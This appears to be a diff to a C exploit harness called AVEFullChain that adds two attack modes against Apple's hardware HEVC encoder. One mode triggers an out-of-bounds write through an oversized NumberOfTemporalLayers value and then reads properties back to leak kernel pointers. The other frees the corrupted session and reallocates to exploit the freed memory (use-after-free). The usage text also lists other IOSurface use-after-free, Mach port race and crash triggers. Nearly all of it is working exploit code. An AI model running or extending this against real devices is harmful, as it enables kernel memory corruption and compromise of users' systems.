@@ -12144,6 +12144,440 @@ vps_cd_done:
         }
         rlog("\n=== DPB_TRIGGER complete ===\n");
 
+    } else if (strcmp(mode, "prop_leak") == 0) {
+        /*
+         * prop_leak — Property readback info leak after NTL OOB write
+         *
+         * After PrepareToEncodeFrames with corrupted NTL, read session
+         * properties back via VTSessionCopySerializableProperties and
+         * VTSessionCopyProperty. Corrupted internal struct fields may
+         * surface as property values containing kernel pointers or
+         * data from adjacent memory.
+         *
+         * Usage: prop_leak [ntl] [encode]
+         *   ntl: NTL value (default: 50 — well past boundary, before hang)
+         *   encode: 1 to also encode a frame before reading (default: 0)
+         */
+        int ntl = (argc > 2) ? atoi(argv[2]) : 50;
+        int do_encode = (argc > 3) ? atoi(argv[3]) : 0;
+        if (ntl < 2) ntl = 2;
+        int vw = 192, vh = 192;
+
+        rlog("=== PROP_LEAK: Property readback after NTL=%d OOB write ===\n", ntl);
+        rlog("encode=%d, res=%dx%d\n\n", do_encode, vw, vh);
+
+        /* Also test a baseline (NTL=2, no corruption) for comparison */
+        int ntl_vals[] = {2, ntl};
+        int num_tests = (ntl == 2) ? 1 : 2;
+
+        for (int t = 0; t < num_tests; t++) {
+            int cur_ntl = ntl_vals[t];
+            rlog("--- NTL=%d %s ---\n", cur_ntl, t == 0 ? "(baseline)" : "(CORRUPTED)");
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) { rlog("create FAIL: %d\n", (int)cs); continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &cur_ntl);
+            OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+            rlog("SetProp NTL=%d: %d\n", cur_ntl, (int)sp);
+
+            rlog("PrepareToEncodeFrames...\n");
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog("Prepare: %d\n", (int)prep);
+            if (prep != noErr) {
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                continue;
+            }
+
+            if (do_encode && t > 0) {
+                rlog("Encoding 1 frame...\n");
+                g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    OSStatus enc = VTCompressionSessionEncodeFrame(s, pb,
+                        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    if (enc == noErr) {
+                        VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                        for (int w = 0; w < 200 && !g_encode_done; w++) usleep(10000);
+                    }
+                    CVPixelBufferRelease(pb);
+                    rlog("Encode: status=%d cb=%d nal=%zu\n",
+                         (int)enc, (int)g_cb_status, g_last_nal_size);
+                }
+            }
+
+            rlog("Reading properties back...\n");
+
+            /* 1. CopySerializableProperties — dumps everything accessible */
+            CFDictionaryRef all_props = NULL;
+            OSStatus cp = VTSessionCopySerializableProperties(s, NULL, &all_props);
+            rlog("CopySerializableProperties: %d\n", (int)cp);
+            if (cp == noErr && all_props) {
+                CFIndex count = CFDictionaryGetCount(all_props);
+                rlog("  Property count: %ld\n", (long)count);
+
+                const void **keys = malloc(sizeof(void*) * count);
+                const void **vals = malloc(sizeof(void*) * count);
+                if (keys && vals) {
+                    CFDictionaryGetKeysAndValues(all_props, keys, vals);
+                    for (CFIndex i = 0; i < count; i++) {
+                        char kbuf[256] = {0};
+                        CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf),
+                                           kCFStringEncodingUTF8);
+
+                        CFTypeID tid = CFGetTypeID(vals[i]);
+                        if (tid == CFNumberGetTypeID()) {
+                            int64_t v64 = 0;
+                            CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v64);
+                            rlog("  [NUM] %s = %lld (0x%llx)\n", kbuf,
+                                 (long long)v64, (unsigned long long)v64);
+                            /* Flag suspicious pointer-sized values */
+                            if ((uint64_t)v64 > 0xffff0000ULL && (uint64_t)v64 != 0xffffffffULL) {
+                                rlog("  *** SUSPICIOUS: looks like pointer! ***\n");
+                            }
+                        } else if (tid == CFBooleanGetTypeID()) {
+                            rlog("  [BOOL] %s = %s\n", kbuf,
+                                 CFBooleanGetValue((CFBooleanRef)vals[i]) ? "true" : "false");
+                        } else if (tid == CFStringGetTypeID()) {
+                            char vbuf[512] = {0};
+                            CFStringGetCString((CFStringRef)vals[i], vbuf, sizeof(vbuf),
+                                               kCFStringEncodingUTF8);
+                            rlog("  [STR] %s = %s\n", kbuf, vbuf);
+                        } else if (tid == CFDataGetTypeID()) {
+                            CFIndex len = CFDataGetLength((CFDataRef)vals[i]);
+                            const uint8_t *bytes = CFDataGetBytePtr((CFDataRef)vals[i]);
+                            rlog("  [DATA] %s (%ld bytes):", kbuf, (long)len);
+                            for (CFIndex b = 0; b < len && b < 64; b++)
+                                rlog(" %02x", bytes[b]);
+                            if (len > 64) rlog(" ...");
+                            rlog("\n");
+                        } else if (tid == CFDictionaryGetTypeID()) {
+                            CFIndex dcount = CFDictionaryGetCount((CFDictionaryRef)vals[i]);
+                            rlog("  [DICT] %s (%ld entries)\n", kbuf, (long)dcount);
+                        } else if (tid == CFArrayGetTypeID()) {
+                            CFIndex alen = CFArrayGetCount((CFArrayRef)vals[i]);
+                            rlog("  [ARR] %s (%ld items)\n", kbuf, (long)alen);
+                        } else {
+                            rlog("  [?] %s (typeID=%lu)\n", kbuf, (unsigned long)tid);
+                        }
+                    }
+                }
+                if (keys) free(keys);
+                if (vals) free(vals);
+                CFRelease(all_props);
+            }
+
+            /* 2. Try specific interesting properties individually */
+            const char *prop_names[] = {
+                "NumberOfTemporalLayers",
+                "BaseLayerBitRateFraction",
+                "BaseLayerFrameRateFraction",
+                "TemporalLayerBitRateRatios",
+                "NumberOfLongTermReferenceFrames",
+                "MaxFrameDelayCount",
+                "ExpectedFrameRate",
+                "AverageBitRate",
+                "MaxH264SliceBytes",
+                "H264EntropyMode",
+                "MaxAllowedFrameQP",
+                "MinAllowedFrameQP",
+                "GammaLevel",
+                "AlphaChannelMode",
+                "EncoderID",
+                "UsingHardwareAcceleratedVideoEncoder",
+                "VideoEncoderPixelBufferAttributes",
+                "SupportedPropertyDictionary",
+                NULL
+            };
+            rlog("\nIndividual property reads:\n");
+            for (int i = 0; prop_names[i]; i++) {
+                CFTypeRef val = NULL;
+                OSStatus ps = VTSessionCopyProperty(s,
+                    CFStringCreateWithCString(NULL, prop_names[i], kCFStringEncodingUTF8),
+                    NULL, &val);
+                if (ps == noErr && val) {
+                    CFTypeID tid = CFGetTypeID(val);
+                    if (tid == CFNumberGetTypeID()) {
+                        int64_t v64 = 0;
+                        CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &v64);
+                        rlog("  %s = %lld (0x%llx)\n", prop_names[i],
+                             (long long)v64, (unsigned long long)v64);
+                        if ((uint64_t)v64 > 0xffff0000ULL && (uint64_t)v64 != 0xffffffffULL) {
+                            rlog("  *** SUSPICIOUS POINTER ***\n");
+                        }
+                    } else if (tid == CFBooleanGetTypeID()) {
+                        rlog("  %s = %s\n", prop_names[i],
+                             CFBooleanGetValue((CFBooleanRef)val) ? "true" : "false");
+                    } else if (tid == CFStringGetTypeID()) {
+                        char vbuf[512] = {0};
+                        CFStringGetCString((CFStringRef)val, vbuf, sizeof(vbuf),
+                                           kCFStringEncodingUTF8);
+                        rlog("  %s = %s\n", prop_names[i], vbuf);
+                    } else if (tid == CFDictionaryGetTypeID()) {
+                        CFIndex dc = CFDictionaryGetCount((CFDictionaryRef)val);
+                        rlog("  %s = dict(%ld entries)\n", prop_names[i], (long)dc);
+                        /* For VideoEncoderPixelBufferAttributes — dump contents */
+                        if (strcmp(prop_names[i], "VideoEncoderPixelBufferAttributes") == 0 ||
+                            strcmp(prop_names[i], "SupportedPropertyDictionary") == 0) {
+                            const void **dk = malloc(sizeof(void*) * dc);
+                            const void **dv = malloc(sizeof(void*) * dc);
+                            if (dk && dv) {
+                                CFDictionaryGetKeysAndValues((CFDictionaryRef)val, dk, dv);
+                                for (CFIndex j = 0; j < dc && j < 20; j++) {
+                                    char kb[256] = {0};
+                                    CFStringGetCString((CFStringRef)dk[j], kb, sizeof(kb),
+                                                       kCFStringEncodingUTF8);
+                                    CFTypeID vt = CFGetTypeID(dv[j]);
+                                    if (vt == CFNumberGetTypeID()) {
+                                        int64_t nv = 0;
+                                        CFNumberGetValue((CFNumberRef)dv[j],
+                                                         kCFNumberSInt64Type, &nv);
+                                        rlog("    %s = %lld (0x%llx)\n", kb,
+                                             (long long)nv, (unsigned long long)nv);
+                                        if ((uint64_t)nv > 0xffff0000ULL &&
+                                            (uint64_t)nv != 0xffffffffULL) {
+                                            rlog("    *** SUSPICIOUS POINTER ***\n");
+                                        }
+                                    } else {
+                                        rlog("    %s = (type %lu)\n", kb, (unsigned long)vt);
+                                    }
+                                }
+                            }
+                            if (dk) free(dk);
+                            if (dv) free(dv);
+                        }
+                    } else if (tid == CFArrayGetTypeID()) {
+                        CFIndex alen = CFArrayGetCount((CFArrayRef)val);
+                        rlog("  %s = array(%ld)\n", prop_names[i], (long)alen);
+                        for (CFIndex j = 0; j < alen && j < 20; j++) {
+                            CFTypeRef av = CFArrayGetValueAtIndex((CFArrayRef)val, j);
+                            if (CFGetTypeID(av) == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue((CFNumberRef)av, kCFNumberSInt64Type, &nv);
+                                rlog("    [%ld] = %lld (0x%llx)\n", (long)j,
+                                     (long long)nv, (unsigned long long)nv);
+                                if ((uint64_t)nv > 0xffff0000ULL &&
+                                    (uint64_t)nv != 0xffffffffULL) {
+                                    rlog("    *** SUSPICIOUS POINTER ***\n");
+                                }
+                            }
+                        }
+                    } else {
+                        rlog("  %s = (type %lu)\n", prop_names[i], (unsigned long)tid);
+                    }
+                    CFRelease(val);
+                } else if (ps != noErr) {
+                    rlog("  %s = ERR %d\n", prop_names[i], (int)ps);
+                }
+            }
+
+            /* 3. Scan for unexpected large numbers in supported props */
+            rlog("\nScanning SupportedPropertyDictionary for pointer-like values...\n");
+            CFDictionaryRef spd = NULL;
+            OSStatus sps = VTSessionCopyProperty(s,
+                CFSTR("SupportedPropertyDictionary"), NULL, &spd);
+            if (sps == noErr && spd) {
+                CFIndex sc = CFDictionaryGetCount(spd);
+                const void **sk = malloc(sizeof(void*) * sc);
+                const void **sv = malloc(sizeof(void*) * sc);
+                if (sk && sv) {
+                    CFDictionaryGetKeysAndValues(spd, sk, sv);
+                    int suspicious = 0;
+                    for (CFIndex i = 0; i < sc; i++) {
+                        if (CFGetTypeID(sv[i]) != CFDictionaryGetTypeID()) continue;
+                        CFDictionaryRef entry = (CFDictionaryRef)sv[i];
+                        CFTypeRef minv = NULL, maxv = NULL, curv = NULL;
+                        CFDictionaryGetValueIfPresent(entry, CFSTR("MinimumValue"), &minv);
+                        CFDictionaryGetValueIfPresent(entry, CFSTR("MaximumValue"), &maxv);
+                        CFDictionaryGetValueIfPresent(entry, CFSTR("CurrentValue"), &curv);
+                        CFTypeRef checks[] = {minv, maxv, curv};
+                        const char *labels[] = {"min", "max", "cur"};
+                        for (int c = 0; c < 3; c++) {
+                            if (!checks[c]) continue;
+                            if (CFGetTypeID(checks[c]) != CFNumberGetTypeID()) continue;
+                            int64_t nv = 0;
+                            CFNumberGetValue((CFNumberRef)checks[c], kCFNumberSInt64Type, &nv);
+                            if ((uint64_t)nv > 0xffff0000ULL && (uint64_t)nv != 0xffffffffULL) {
+                                char kb[256] = {0};
+                                CFStringGetCString((CFStringRef)sk[i], kb, sizeof(kb),
+                                                   kCFStringEncodingUTF8);
+                                rlog("  LEAK? %s.%s = 0x%llx\n", kb, labels[c],
+                                     (unsigned long long)nv);
+                                suspicious++;
+                            }
+                        }
+                    }
+                    if (suspicious == 0) rlog("  No pointer-like values found\n");
+                }
+                if (sk) free(sk);
+                if (sv) free(sv);
+                CFRelease(spd);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            rlog("Teardown OK\n\n");
+            usleep(100000);
+        }
+
+        rlog("=== PROP_LEAK complete ===\n");
+
+    } else if (strcmp(mode, "heap_reuse") == 0) {
+        /*
+         * heap_reuse — Multi-session UAF via NTL heap corruption
+         *
+         * Session A: Create with high NTL (massive OOB write), then
+         * invalidate/free. Session B: immediately create — B's pClient
+         * may overlap with A's corrupted freed memory.
+         *
+         * If B inherits corrupted pool pointers from A's freed allocation,
+         * encoding with B could dereference kernel pointers.
+         *
+         * Usage: heap_reuse [ntl] [gap_ms] [rounds]
+         *   ntl: NTL for session A corruption (default: 1000)
+         *   gap_ms: delay between A free and B create in ms (default: 0)
+         *   rounds: iterations (default: 5)
+         */
+        int ntl = (argc > 2) ? atoi(argv[2]) : 1000;
+        int gap_ms = (argc > 3) ? atoi(argv[3]) : 0;
+        int rounds = (argc > 4) ? atoi(argv[4]) : 5;
+        if (ntl < 8) ntl = 8;
+        if (rounds < 1) rounds = 1;
+        if (rounds > 20) rounds = 20;
+        int vw = 192, vh = 192;
+
+        rlog("=== HEAP_REUSE: Multi-session UAF via NTL corruption ===\n");
+        rlog("ntl=%d, gap=%dms, rounds=%d, res=%dx%d\n\n", ntl, gap_ms, rounds, vw, vh);
+
+        for (int r = 0; r < rounds; r++) {
+            rlog("--- Round %d/%d ---\n", r + 1, rounds);
+
+            /* Session A: corrupt with high NTL, then free */
+            rlog("A: Creating with NTL=%d (OOB write)...\n", ntl);
+            VTCompressionSessionRef sa = NULL;
+            CFMutableDictionaryRef esa = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(esa, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(esa, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus csa = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, esa, NULL, NULL, encode_cb, NULL, &sa);
+            CFRelease(esa);
+            if (csa != noErr || !sa) { rlog("A: create FAIL\n"); continue; }
+
+            VTSessionSetProperty(sa, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            VTSessionSetProperty(sa, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+
+            OSStatus prepa = VTCompressionSessionPrepareToEncodeFrames(sa);
+            rlog("A: Prepare=%d (OOB write of %d entries done)\n", (int)prepa, ntl);
+
+            rlog("A: Invalidating + releasing (freeing corrupted pClient)...\n");
+            VTCompressionSessionInvalidate(sa);
+            CFRelease(sa);
+            rlog("A: Freed\n");
+
+            if (gap_ms > 0) usleep(gap_ms * 1000);
+
+            /* Session B: create immediately — may reuse A's memory */
+            rlog("B: Creating (hoping to reuse A's freed allocation)...\n");
+            VTCompressionSessionRef sb = NULL;
+            CFMutableDictionaryRef esb = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(esb, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(esb, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus csb = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, esb, NULL, NULL, encode_cb, NULL, &sb);
+            CFRelease(esb);
+            if (csb != noErr || !sb) { rlog("B: create FAIL\n"); continue; }
+
+            VTSessionSetProperty(sb, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            int ntl2 = 2;
+            CFNumberRef ntl2_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl2);
+            VTSessionSetProperty(sb, CFSTR("NumberOfTemporalLayers"), ntl2_num);
+            CFRelease(ntl2_num);
+
+            OSStatus prepb = VTCompressionSessionPrepareToEncodeFrames(sb);
+            rlog("B: Prepare=%d\n", (int)prepb);
+            if (prepb != noErr) {
+                VTCompressionSessionInvalidate(sb); CFRelease(sb);
+                continue;
+            }
+
+            /* Encode with B — if it reused A's corrupted memory, this may panic */
+            rlog("B: Encoding 3 frames (testing for stale data)...\n");
+            int b_ok = 0;
+            for (int f = 0; f < 3; f++) {
+                g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (!pb) continue;
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *base = CVPixelBufferGetBaseAddress(pb);
+                if (base) memset(base, 0x42 + f, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                OSStatus enc = VTCompressionSessionEncodeFrame(sb, pb,
+                    CMTimeMake(f, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                if (enc == noErr) {
+                    VTCompressionSessionCompleteFrames(sb, kCMTimePositiveInfinity);
+                    for (int w = 0; w < 150 && !g_encode_done; w++) usleep(10000);
+                }
+                CVPixelBufferRelease(pb);
+                rlog("B: F%d enc=%d cb=%d nal=%zu\n",
+                     f, (int)enc, (int)g_cb_status, g_last_nal_size);
+                if (g_last_nal_size > 0) b_ok++;
+            }
+
+            /* Read B's properties to check for stale data from A */
+            rlog("B: Reading properties...\n");
+            CFDictionaryRef bp = NULL;
+            VTSessionCopySerializableProperties(sb, NULL, &bp);
+            if (bp) {
+                CFIndex bc = CFDictionaryGetCount(bp);
+                const void **bk = malloc(sizeof(void*) * bc);
+                const void **bv = malloc(sizeof(void*) * bc);
+                if (bk && bv) {
+                    CFDictionaryGetKeysAndValues(bp, bk, bv);
+                    for (CFIndex i = 0; i < bc; i++) {
+                        if (CFGetTypeID(bv[i]) != CFNumberGetTypeID()) continue;
+                        int64_t v64 = 0;
+                        CFNumberGetValue((CFNumberRef)bv[i], kCFNumberSInt64Type, &v64);
+                        if ((uint64_t)v64 > 0xffff0000ULL && (uint64_t)v64 != 0xffffffffULL) {
+                            char kb[256] = {0};
+                            CFStringGetCString((CFStringRef)bk[i], kb, sizeof(kb),
+                                               kCFStringEncodingUTF8);
+                            rlog("  LEAK? %s = 0x%llx\n", kb, (unsigned long long)v64);
+                        }
+                    }
+                }
+                if (bk) free(bk);
+                if (bv) free(bv);
+                CFRelease(bp);
+            }
+
+            rlog("B: encode_ok=%d/3\n", b_ok);
+            VTCompressionSessionInvalidate(sb);
+            CFRelease(sb);
+            rlog("B: Teardown OK\n\n");
+            usleep(100000);
+        }
+
+        rlog("=== HEAP_REUSE complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -12197,6 +12631,8 @@ vps_cd_done:
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  iosurface_uaf [rounds] [groom] [threads] -- KEY: CVE-112477 IOSurface UAF trigger\n");
         rlog("  iosurface_enum [max_sel] [async]  -- KEY: Exhaustive IOSurface selector scan\n");
+        rlog("  prop_leak [ntl] [encode]          -- Property readback info leak after OOB\n");
+        rlog("  heap_reuse [ntl] [gap] [rounds]  -- Multi-session UAF via NTL corruption\n");
         rlog("  ntl_crash [phase] [frames]       -- KEY: NTL=16464 multi-frame pool crash\n");
         rlog("  mach_race [rounds] [groom] [threads] -- KEY: Mach port IOSurface UAF race\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
